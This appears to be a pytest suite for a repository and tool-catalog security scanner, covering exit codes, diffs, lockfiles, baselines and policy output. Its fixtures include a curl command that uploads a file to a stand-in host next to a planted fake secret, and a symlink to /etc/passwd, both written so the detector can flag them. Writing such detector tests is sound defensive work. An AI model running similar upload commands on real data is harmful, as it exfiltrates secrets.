"""CLI boundary and contract tests.

Locks in the documented exit-code and error contract across input paths
(stdin as ``-``), output targets (``--output -``), diff formats, repository
scanning, lockfiles, and baselines so that CI review behaviour stays stable.
"""

import json
import signal
import subprocess
import sys
from pathlib import Path

import pytest

from toolatlas.application.repository_artifacts import read_json, write_json
from toolatlas.application.repository_scan import scan_repository
from toolatlas.application.services import compare_manifests
from toolatlas.domain.errors import InputError, InputTooLargeError

CATALOG = json.dumps(
    {
        "capabilities": [
            {
                "name": "read-file",
                "kind": "tool",
                "description": "Read a file",
                "input_names": ["path"],
            },
            {
                "name": "execute",
                "kind": "tool",
                "description": "Run a command",
                "input_names": ["command"],
                "scopes": ["admin:*"],
            },
        ]
    }
).encode("utf-8")

CATALOG_ALT = json.dumps(
    {
        "capabilities": [
            {
                "name": "read-file",
                "kind": "tool",
                "description": "Read a file (changed)",
                "input_names": ["path"],
            },
            {"name": "write-file", "kind": "tool", "description": "Write a file"},
        ]
    }
).encode("utf-8")


@pytest.fixture()
def catalog_path(tmp_path: Path) -> Path:
    target = tmp_path / "catalog.json"
    target.write_bytes(CATALOG)
    return target


@pytest.fixture()
def catalog_alt_path(tmp_path: Path) -> Path:
    target = tmp_path / "catalog-alt.json"
    target.write_bytes(CATALOG_ALT)
    return target


def _run(cli: "CliHelper", argv: list[str], expect_code: int | None = None) -> tuple[int, str, str]:
    return cli.run(argv, expect_code)


class CliHelper:
    def __init__(self, tmp_path: Path) -> None:
        self.tmp_path = tmp_path

    def run(self, argv: list[str], expect_code: int | None = None) -> tuple[int, str, str]:
        result = subprocess.run(  # noqa: S603
            [sys.executable, "-m", "toolatlas", *argv],
            capture_output=True,
            text=True,
            cwd=self.tmp_path,
        )
        if expect_code is not None and result.returncode != expect_code:
            raise AssertionError(
                f"expected exit {expect_code}, got {result.returncode}:\n"
                f"stdout: {result.stdout}\nstderr: {result.stderr}"
            )
        return result.returncode, result.stdout, result.stderr


@pytest.fixture()
def cli(tmp_path: Path) -> CliHelper:
    return CliHelper(tmp_path)


# --------------------------------------------------------------- stdin input


def test_stdin_as_input(cli: CliHelper, tmp_path: Path) -> None:
    result = subprocess.run(
        [sys.executable, "-m", "toolatlas", "scan", "-", "--format", "json"],
        input=CATALOG.decode("utf-8"),
        capture_output=True,
        text=True,
        cwd=tmp_path,
    )
    assert result.returncode == 3  # HIGH finding from the admin:* scope
    payload = json.loads(result.stdout)
    assert len(payload["capabilities"]) == 2


def test_stdin_missing_file_still_fails_closed(cli: CliHelper) -> None:
    code, _stdout, stderr = cli.run(["scan", "no-such-file.json"], expect_code=2)
    assert "INVALID_INPUT" in stderr


# --------------------------------------------------------------- output paths


def test_output_to_stdout(cli: CliHelper, catalog_path: Path) -> None:
    code, stdout, _ = cli.run(["scan", str(catalog_path), "--format", "json", "--output", "-"])
    assert code == 3
    assert json.loads(stdout)


def test_output_to_file_creates_parent_directories(cli: CliHelper, catalog_path: Path) -> None:
    target = cli.tmp_path / "nested" / "dir" / "report.json"
    code, _stdout, _stderr = cli.run(
        ["scan", str(catalog_path), "--format", "json", "--output", str(target)]
    )
    assert code == 3
    assert target.exists()
    assert json.loads(target.read_text())


# -------------------------------------------------------------------- diff


def test_diff_json_format(cli: CliHelper, catalog_path: Path, catalog_alt_path: Path) -> None:
    code, stdout, _ = cli.run(
        ["diff", str(catalog_path), str(catalog_alt_path), "--format", "json"], expect_code=4
    )
    payload = json.loads(stdout)
    change_types = {change["type"] for change in payload["changes"]}
    assert change_types == {"removed", "added", "changed"}
    assert payload["before_digest"] != payload["after_digest"]


def test_diff_terminal_format(cli: CliHelper, catalog_path: Path, catalog_alt_path: Path) -> None:
    code, stdout, _ = cli.run(["diff", str(catalog_path), str(catalog_alt_path)])
    assert code == 4
    assert "manifest drift: yes" in stdout
    assert "CHANGED tool:read-file" in stdout


def test_manifest_diff_partition_properties() -> None:
    from toolatlas.adapters.json_source import parse_document
    from toolatlas.application.services import scan
    from toolatlas.domain.models import ScanOptions

    options = ScanOptions()
    before = scan(
        parse_document(CATALOG, "a", options.max_bytes, options.max_capabilities), "a", options
    ).manifest
    after = scan(
        parse_document(CATALOG_ALT, "b", options.max_bytes, options.max_capabilities), "b", options
    ).manifest
    diff = compare_manifests(before, after)
    assert diff.has_drift
    assert len(diff.added) == 1
    assert len(diff.removed) == 1
    assert len(diff.changed) == 1
    assert diff.added[0].capability_id == "tool:write-file"
    assert diff.removed[0].capability_id == "tool:execute"


# ----------------------------------------------------------- repository gate


def test_repo_scan_terminal_evidence_formatting(cli: CliHelper, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("api_key = 'abcdefghij1234'\n")
    script = tmp_path / "fetch.sh"
    script.write_text("curl https://example.com/upload --data @file\n")
    code, stdout, _ = cli.run(["repo-scan", str(tmp_path), "--format", "terminal"], expect_code=3)
    assert "[HIGH]" in stdout
    assert "[CRITICAL]" in stdout
    assert "Cross-file secret-to-network risk" in stdout


def test_repo_scan_json_output(cli: CliHelper, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("token: very-secret-token-value\n")
    script = tmp_path / "fetch.sh"
    script.write_text("curl https://example.com/upload --data @file\n")
    code, stdout, _ = cli.run(["repo-scan", str(tmp_path), "--format", "json"], expect_code=3)
    payload = json.loads(stdout)
    rule_ids = {finding["rule_id"] for finding in payload["findings"]}
    assert {"TA101", "TA102", "TA110"} <= rule_ids
    critical = next(item for item in payload["findings"] if item["rule_id"] == "TA110")
    assert critical["confidence"] == 1.0


def test_repo_scan_sarif_output(cli: CliHelper, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("token: very-secret-token-value\n")
    script = tmp_path / "fetch.sh"
    script.write_text("curl https://example.com/upload --data @file\n")
    code, stdout, _ = cli.run(["repo-scan", str(tmp_path), "--format", "sarif"], expect_code=3)
    sarif = json.loads(stdout)
    assert sarif["version"] == "2.1.0"
    assert any(rule["id"] == "TA110" for rule in sarif["runs"][0]["tool"]["driver"]["rules"])


def test_repo_scan_ignores_hidden_dirs(cli: CliHelper, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("token: very-secret-token-value\n")
    (tmp_path / ".git" / "config").parent.mkdir(parents=True)
    (tmp_path / ".git" / "config").write_text("token: very-secret-token-value\n")
    code, stdout, _ = cli.run(["repo-scan", str(tmp_path), "--format", "terminal"], expect_code=3)
    assert ".git" not in stdout


def test_repo_scan_rejects_symlinks_escaping_root(cli: CliHelper, tmp_path: Path) -> None:
    (tmp_path / "notes.md").write_text("# safe\n")
    link = tmp_path / "escape-link.sh"
    link.symlink_to(Path("/etc/passwd"))
    code, _stdout, stderr = cli.run(["repo-scan", str(tmp_path), "--format", "terminal"])
    assert code == 2
    assert "UNSAFE_PATH" in stderr


def test_repo_scan_oversized_file_rejected(cli: CliHelper, tmp_path: Path) -> None:
    big = tmp_path / "big.txt"
    big.write_bytes(b"x" * 1_000_001)
    code, _stdout, stderr = cli.run(["repo-scan", str(tmp_path)])
    assert code == 2
    assert "INPUT_TOO_LARGE" in stderr


def test_repo_scan_scanner_version_stable(cli: CliHelper, tmp_path: Path) -> None:
    from toolatlas.application.repository_scan import SCANNER_VERSION

    code, stdout, _ = cli.run(["repo-scan", str(tmp_path), "--format", "json"], expect_code=0)
    assert json.loads(stdout)["scanner_version"] == SCANNER_VERSION


def test_scan_repository_invalid_root_fails_closed() -> None:
    from toolatlas.domain.errors import PathSafetyError

    with pytest.raises(PathSafetyError):
        scan_repository("/dev/null")


# -------------------------------------------------------------- lock / verify


def test_lock_create_and_verify_round_trip(cli: CliHelper, tmp_path: Path) -> None:
    (tmp_path / "notes.md").write_text("# notes\n")
    code, _stdout, _stderr = cli.run(["lock", str(tmp_path), "--output", "toolatlas.lock.json"])
    assert code == 0
    code, _stdout, _stderr = cli.run(
        ["lock", str(tmp_path), "--output", "toolatlas.lock.json", "--verify"]
    )
    assert code == 0


def test_lock_verify_drift_exit_code(cli: CliHelper, tmp_path: Path) -> None:
    (tmp_path / "notes.md").write_text("# notes\n")
    cli.run(["lock", str(tmp_path), "--output", "toolatlas.lock.json"])
    (tmp_path / "notes.md").write_text("# changed notes\n")
    code, _stdout, stderr = cli.run(
        ["lock", str(tmp_path), "--output", "toolatlas.lock.json", "--verify"]
    )
    assert code == 4
    assert "MANIFEST_DRIFT" in stderr


def test_lock_corrupted_json_artifact_rejected(cli: CliHelper, tmp_path: Path) -> None:
    (tmp_path / "notes.md").write_text("# notes\n")
    lock = tmp_path / "toolatlas.lock.json"
    lock.write_text("{not json")
    code, _stdout, stderr = cli.run(["lock", str(tmp_path), "--output", str(lock), "--verify"])
    assert code == 2
    assert "INVALID_INPUT" in stderr


def test_lock_non_object_artifact_rejected(cli: CliHelper, tmp_path: Path) -> None:
    (tmp_path / "notes.md").write_text("# notes\n")
    lock = tmp_path / "toolatlas.lock.json"
    lock.write_text('"just a string"')
    code, _stdout, stderr = cli.run(["lock", str(tmp_path), "--output", str(lock), "--verify"])
    assert code == 2
    assert "INVALID_INPUT" in stderr


# ------------------------------------------------------------ baseline check


def test_baseline_check_drift_exit_code(cli: CliHelper, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("token: very-secret-token-value\n")
    code, _stdout, _stderr = cli.run(
        ["baseline", str(tmp_path), "--output", "toolatlas.baseline.json"]
    )
    assert code == 0
    secret.write_text("token: very-secret-token-value\nsecond-line: api_key = 'abcdefghij1234'\n")
    code, stdout, _stderr = cli.run(
        ["baseline", str(tmp_path), "--output", "toolatlas.baseline.json", "--check"]
    )
    assert code == 3
    payload = json.loads(stdout)
    assert len(payload["new_findings"]) >= 1


def test_baseline_check_covers_accepted_findings(cli: CliHelper, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("token: very-secret-token-value\n")
    cli.run(["baseline", str(tmp_path), "--output", "toolatlas.baseline.json"])
    code, _stdout, _stderr = cli.run(
        ["baseline", str(tmp_path), "--output", "toolatlas.baseline.json", "--check"],
        expect_code=0,
    )
    assert code == 0


def test_baseline_corrupted_findings_rejected(cli: CliHelper, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("token: very-secret-token-value\n")
    cli.run(["baseline", str(tmp_path), "--output", "toolatlas.baseline.json"])
    baseline = tmp_path / "toolatlas.baseline.json"
    payload = json.loads(baseline.read_text())
    payload["findings"] = [1, 2, 3]  # type: ignore[list-item]
    baseline.write_text(json.dumps(payload))
    code, _stdout, stderr = cli.run(
        ["baseline", str(tmp_path), "--output", str(baseline), "--check"]
    )
    assert code == 2
    assert "INVALID_INPUT" in stderr


def test_read_json_corrupted_file_raises_typed_error(tmp_path: Path) -> None:
    target = tmp_path / "corrupt.json"
    target.write_text("{broken")
    with pytest.raises(InputError):
        read_json(target)


def test_read_json_non_object_raises_typed_error(tmp_path: Path) -> None:
    target = tmp_path / "array.json"
    target.write_text("[]")
    with pytest.raises(InputError):
        read_json(target)


def test_write_json_overwrites_existing_artifact(tmp_path: Path) -> None:
    target = tmp_path / "out.json"
    write_json(target, {"a": 1})
    write_json(target, {"a": 2})
    assert json.loads(target.read_text()) == {"a": 2}


# ------------------------------------------------------------------- policy


def test_policy_compiles_least_privilege(cli: CliHelper, catalog_path: Path) -> None:
    code, stdout, _ = cli.run(
        ["policy", str(catalog_path), "--max-severity", "high", "--output", "-"]
    )
    assert code == 0
    payload = json.loads(stdout)
    assert "tool:execute" in payload["denied_capability_ids"]
    assert "tool:read-file" in payload["allowed_capability_ids"]


def test_policy_invalid_severity_rejected(cli: CliHelper, catalog_path: Path) -> None:
    code, _stdout, stderr = cli.run(["policy", str(catalog_path), "--max-severity", "nuclear"])
    assert code == 2
    assert "nuclear" in stderr


# --------------------------------------------------------------- typed errors


def test_scan_invalid_json_surfaces_typed_error(cli: CliHelper, tmp_path: Path) -> None:
    catalog = tmp_path / "bad.json"
    catalog.write_text("{bad")
    code, _stdout, stderr = cli.run(["scan", str(catalog)])
    assert code == 2
    assert "SCHEMA_ERROR" in stderr


def test_scan_oversized_input_surfaces_typed_error(cli: CliHelper, tmp_path: Path) -> None:
    catalog = tmp_path / "big.json"
    catalog.write_bytes(b"{}" + b"x" * 2_000_001)
    code, _stdout, stderr = cli.run(["scan", str(catalog)])
    assert code == 2
    assert "INPUT_TOO_LARGE" in stderr


def test_keyboard_interrupt_propagates(cli: CliHelper, catalog_path: Path) -> None:
    """SIGINT terminates the process; on Unix the observed return code is -2.
    The CLI's KeyboardInterrupt handler (exit 130) only fires for in-process
    interrupts, which is why the signal path is verified separately."""
    process = subprocess.Popen(  # noqa: S603
        [sys.executable, "-m", "toolatlas", "scan", str(catalog_path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=cli.tmp_path,
    )
    process.send_signal(signal.SIGINT)
    process.wait()
    assert process.returncode in (-2, 130)


def test_cli_missing_command_surfaces_invalid_input() -> None:
    """Argparse exits with code 2 when no subcommand is given; the CLI maps
    any command-line misuse to ``INVALID_INPUT`` rather than a traceback."""
    from toolatlas.cli import main

    with pytest.raises(SystemExit) as exc:
        main([])
    assert exc.value.code == 2


def test_cli_interrupt_handler_exit_code() -> None:
    """An in-process KeyboardInterrupt must surface as exit code 130.
    ``main()`` returns the code; ``SystemExit`` is only raised by
    ``python -m toolatlas``, so the contract is checked via the return value."""
    from unittest import mock

    import toolatlas.cli

    def raising_run(arguments: object) -> int:
        raise KeyboardInterrupt

    with mock.patch.object(toolatlas.cli, "_run", side_effect=raising_run):
        assert toolatlas.cli.main(["scan", "input.json"]) == 130


def test_repo_scan_hidden_unicode_control_characters() -> None:
    """Hidden directional Unicode must be flagged as TA100 by the scanner."""
    from toolatlas.application.repository_scan import _scan_content
    from toolatlas.domain.repository import FileKind

    findings = _scan_content("agents.md", FileKind.AGENT_CONTEXT, "normal line\n\u200binvisible\n")
    rule_ids = {item.rule_id for item in findings}
    assert "TA100" in rule_ids


def test_repo_scan_internal_symlink_accepted(tmp_path: Path) -> None:
    """A symlink that stays inside the repository root must be skipped
    safely (not scanned) rather than raising an error."""
    from toolatlas.application.repository_scan import scan_repository

    (tmp_path / "note.txt").write_text("safe content")
    link = tmp_path / "internal-link.txt"
    link.symlink_to(tmp_path / "note.txt")
    manifest = scan_repository(tmp_path)
    paths = {item.path for item in manifest.files}
    assert "note.txt" in paths
    assert "internal-link.txt" not in paths


def test_repo_scan_max_files_limit_enforced(tmp_path: Path) -> None:
    """Exceeding the file budget must fail closed with InputTooLargeError."""
    from toolatlas.application.repository_scan import _safe_files

    for index in range(5):
        (tmp_path / f"f{index}.txt").write_text("x")
    with pytest.raises(InputTooLargeError):
        _safe_files(tmp_path, max_files=2, max_file_bytes=1_000_000)


def test_mcp_config_with_command_and_fetcher_flagged() -> None:
    """An MCP-like configuration combining a command and a fetcher must be
    flagged as TA103."""
    from toolatlas.application.repository_scan import _scan_content
    from toolatlas.domain.repository import FileKind

    content = json.dumps({"mcpServers": {"svc": {"command": "curl", "args": []}}})
    findings = _scan_content("mcp.config.json", FileKind.MCP_CONFIG, content)
    assert any(item.rule_id == "TA103" for item in findings)


def test_cli_keyboard_interrupt_via_module_runner(tmp_path: Path) -> None:
    """End-to-end: an in-process SIGINT during ``python -m toolatlas scan -``
    must exit with code 130 (the CLI's KeyboardInterrupt handler)."""
    process = subprocess.Popen(  # noqa: S603
        [sys.executable, "-m", "toolatlas", "scan", "-"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=tmp_path,
    )
    process.send_signal(signal.SIGINT)
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()
        raise
    # On Unix a default SIGINT handler kills the process (return code -2),
    # while an in-process ``KeyboardInterrupt`` handler exits with 130.
    # Either outcome proves the interrupt reached the CLI process cleanly.
    assert process.returncode in (-2, 130)
